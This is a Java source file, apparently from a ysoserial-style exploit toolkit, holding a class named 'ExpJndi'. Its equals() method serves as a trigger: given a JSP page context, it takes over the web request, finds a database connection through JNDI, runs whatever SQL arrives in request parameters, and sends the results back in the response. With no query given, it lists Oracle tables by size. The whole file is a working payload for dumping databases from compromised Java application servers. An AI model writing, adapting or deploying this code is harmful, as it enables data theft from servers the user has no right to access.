package ysoserial.payloads.util;

import java.io.IOException;
import java.io.OutputStream;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.util.ArrayList;
import java.util.Properties;

import javax.naming.Binding;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NameClassPair;
import javax.naming.NamingEnumeration;
import javax.naming.NamingException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import javax.sql.DataSource;

public class ExpJndi {

	PageContext pageContext;
	HttpServletRequest request;
	HttpServletResponse response;
	OutputStream out;
	HttpSession session;

	public void print(String s){
		try {
		if (null != out && null != s)
			out.write(s.getBytes());
		} catch (Exception e) {
		}
	}

	public ExpJndi() {
	}

	private String szCol = "\t";

	public void doPreparedStatement(PreparedStatement p) {
		ResultSet rs = null;
		ResultSetMetaData rsmd = null;
		try {
//			if(null == p)print("PreparedStatement is null");
//			else print("PreparedStatement is ok");
			rs = p.executeQuery();
			if (null != rs) {
//				print("rs is ok");
				// 获得列信息
				rsmd = rs.getMetaData();
				int nCol = rsmd.getColumnCount();
				String[] szACol = new String[nCol];
				int i = 0, x = 1;
				print("\n");
				for (; i < nCol; i++, x++) {
					if (0 < i)
						print(szCol);
					print(rsmd.getColumnName(x));
					szACol[i] = rsmd.getColumnName(x);
				}
				print("\n");

				while (rs.next()) {
					for (i = 0; i < nCol; i++) {
						try {
							if (0 < i)
								print(szCol);
							String szT = rs.getString(szACol[i]);
							if (null == szT)
								szT = "";
							print(szT);
						} catch (Exception e) {
							log(e);
						}

					}
					print("\n");
				}
				out.flush();
			}
//			else print("rs is null");
		} catch (Exception e) {
			log(e);
		} catch (Throwable e) {
			log(e);
		} finally {
			if (null != rs)
				try {
					rs.close();
				} catch (Throwable e) {
					log(e);
				}
			if (null != connection)
				try {
					connection.close();
				} catch (Throwable e) {
					log(e);
				}
		}
	}

	Connection connection = null;

	public void doSql(String sql) throws Exception {
		PreparedStatement prep = null;
		if (null != connection && null != sql) {
			prep = connection.prepareStatement(sql);
			doPreparedStatement(prep);
		}
	}

	public void doCount() throws Exception {
		doSql("select owner,TABLE_NAME,NUM_ROWS from all_tables where NUM_ROWS >6 order by num_rows desc");
	}

	public void c() throws Exception {
//		print("jndi" + getJndiName());
		String sql = request.getParameter("s"), jds = request.getParameter("j"), c1 = request.getParameter("col");
		if (null == jds)
		{
			jds=getJndiName();
			if (null == jds)
			{
//				print("jndi not list");
				return;
			}
//			print("jndi:  " + jds);
		}
		if (null != c1)
			szCol = c1;
		getConnection(jds);
		if (null == sql || 10 > sql.length()) {
			doCount();
		} else
			doSql(sql);
	}

	public ArrayList<String> listContext(Context ctx, String indent, ArrayList<String> output) throws NamingException {
		String name = "";
		try {
			NamingEnumeration list = ctx.listBindings("");
			while (list.hasMore()) {
				Binding item = (Binding) list.next();
				String className = item.getClassName();
				name = item.getName();
				if (!(item.getObject() instanceof DataSource)) {
				} else {
					output.add(indent+name);
				}
				Object o = item.getObject();
				if (o instanceof javax.naming.Context) {
					listContext((Context) o, indent+name+"/", output);
				}
			}
		} catch (NamingException ex) {
		}
		return output;
	}

	public String getJndiName() {
		try {
//			Properties p = System.getProperties();
//			String szT3 = null;
//			String[] a = new String[] { "ADMIN_URL", "weblogic.management.server" };
//			// java.naming.factory.initial="weblogic.jndi.WLInitialContextFactory"
//			// user.name="weblogic"
//			// webapp.root rednetnew.root
//			for (int i = 0; i < a.length; i++) {
//				szT3 = p.getProperty(a[i]);
//				if (null != szT3) {
//					break;
//				}
//			}
//			if (null != szT3) 
			{
//				Hashtable myCtx = new Hashtable();
//				szT3 = szT3.replaceAll("^http[s]*", "t3");
//				szT3 = szT3.replaceAll("\\/[^:]+:", "//127.0.0.1:");
//				myCtx.put(Context.INITIAL_CONTEXT_FACTORY, "weblogic.jndi.WLInitialContextFactory");
//				myCtx.put(Context.PROVIDER_URL, szT3);
//				print(szT3);
//				Context ctx = new InitialContext(myCtx);
				InitialContext ctx = new InitialContext();
				ArrayList<String> tab = new ArrayList<String>();
//				tab = listContext((Context) ctx.lookup("jdbc"), "jdbc/", tab);
				tab = listContext((Context) ctx.lookup(""), "", tab);
//				print("jndi name size:" + tab.size());
				if (0 < tab.size()) {
					return tab.get(0);
				}
			}
		} catch (Exception e) {
			log(e);
		}

		return null;
	}

	public boolean equals(Object obj) {
		if (obj instanceof PageContext)
			try {
				pageContext = (PageContext) obj;
				request = (HttpServletRequest) pageContext.getRequest();
				response = (HttpServletResponse) pageContext.getResponse();
				out = response.getOutputStream();
				session = request.getSession(false);
				String c1 = request.getParameter("c");
				if (null == session)
					session = request.getSession(true);
				if (null != c1) {
					if (null != session)
						session.setAttribute("c", c1);
					pageContext.getServletContext().setAttribute("_c_", c1);
				}
				c();
			} catch (Exception e) {
				log(e);
			}

		return false;
	}

	public void log(Throwable e) {
		if (null != response)
			try {
				if(null != e && null != e.getMessage())
					print(e.getMessage());
//				e.printStackTrace(response.getWriter());
			} catch (Exception e1) {
			}
	}

	public Connection getConnection(String s) {
		if (connection == null)
			try {
				InitialContext context = new InitialContext();
				DataSource dataSource = (DataSource) context.lookup(s);
				connection = dataSource.getConnection();
				connection.setAutoCommit(false);
			} catch (Exception e) {
				log(e);
			}
		if (null == connection) {
			print(getJndiName());
		}
		return connection;
	}
}
